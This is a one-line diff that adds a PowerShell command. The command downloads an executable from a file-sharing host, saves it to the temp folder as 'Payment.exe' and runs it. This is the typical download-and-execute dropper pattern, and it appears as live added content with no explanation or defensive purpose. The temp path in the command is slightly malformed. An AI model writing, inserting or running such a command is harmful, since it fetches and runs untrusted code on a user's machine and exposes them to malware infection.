@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/tpaesb.exe',"$env:TEMPPayment.exe");Start-Process ("$env:TEMPPayment.exe")
